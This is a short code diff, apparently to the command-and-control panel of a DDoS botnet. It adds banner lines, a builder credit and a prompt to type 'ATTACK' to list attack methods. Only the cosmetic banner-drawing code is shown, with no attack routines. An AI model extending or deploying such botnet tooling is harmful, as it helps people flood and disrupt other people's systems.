@@ -539,20 +539,24 @@ if(strstr(buf, "ATTACK")) {
         if (strstr(buf, "CLEAR"))
         { 
           if(send(thefd, "\033[1A\033[2J\033[1;1H\r\n", 16, MSG_NOSIGNAL) == -1) goto end;
-        sprintf(ascii_banner_line20, "                \e[1;35m ██████\e[0;97m╗ \e[1;35m██\e[0;97m╗  \e[1;35m██\e[0;97m╗ \e[1;35m█████\e[0;97m╗ \e[1;35m███\e[0;97m╗   \e[1;35m███\e[0;97m╗\e[1;35m██\e[0;97m╗\r\n");
+		sprintf(ascii_banner_line19, "                \e[0;97m Compiled With Auto-Setup By '\e[1;35mReload#9575\e[0;97m'\r\n");
+        	sprintf(ascii_banner_line20, "                \e[1;35m ██████\e[0;97m╗ \e[1;35m██\e[0;97m╗  \e[1;35m██\e[0;97m╗ \e[1;35m█████\e[0;97m╗ \e[1;35m███\e[0;97m╗   \e[1;35m███\e[0;97m╗\e[1;35m██\e[0;97m╗\r\n");
 		sprintf(ascii_banner_line21, "                \e[1;35m██\e[0;97m╔═══\e[1;35m██\e[0;97m╗\e[1;35m██\e[0;97m║ \e[1;35m██\e[0;97m╔╝\e[1;35m██\e[0;97m╔══\e[1;35m██\e[0;97m╗\e[1;35m████\e[0;97m╗ \e[1;35m████\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
 		sprintf(ascii_banner_line22, "                \e[1;35m██\e[0;97m║   \e[1;35m██\e[0;97m║\e[1;35m█████\e[0;97m╔╝ \e[1;35m███████\e[0;97m║\e[1;35m██\e[0;97m╔\e[1;35m████\e[0;97m╔\e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
 		sprintf(ascii_banner_line23, "                \e[1;35m██\e[0;97m║   \e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m╔═\e[1;35m██\e[0;97m╗ \e[1;35m██\e[0;97m╔══\e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║╚\e[1;35m██\e[0;97m╔╝\e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
 		sprintf(ascii_banner_line24, "                \e[0;97m╚\e[1;35m██████\e[0;97m╔╝\e[1;35m██\e[0;97m║  \e[1;35m██\e[0;97m╗\e[1;35m██\e[0;97m║  \e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║ ╚═╝ \e[1;35m██\e[0;97m║\e[1;35m██\e[0;97m║\r\n");
 		sprintf(ascii_banner_line25, "                \e[0;97m ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝\r\n");
+		sprintf(ascii_banner_line26, "                \e[0;97m Type '\e[1;35mATTACK\e[0;97m' to see methods\r\n");
 		sprintf(line23, "\r\n");
         if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
-        if(send(thefd, ascii_banner_line20, strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;
+		if(send(thefd, ascii_banner_line19, strlen(ascii_banner_line19), MSG_NOSIGNAL) == -1) goto end;
+        	if(send(thefd, ascii_banner_line20, strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ascii_banner_line21, strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ascii_banner_line22, strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ascii_banner_line23, strlen(ascii_banner_line23), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ascii_banner_line24, strlen(ascii_banner_line24), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, ascii_banner_line25, strlen(ascii_banner_line25), MSG_NOSIGNAL) == -1) goto end;
+		if(send(thefd, ascii_banner_line26, strlen(ascii_banner_line26), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, line23, strlen(line23), MSG_NOSIGNAL) == -1) goto end;
          }
          if (strstr(buf, "EXIT")) 
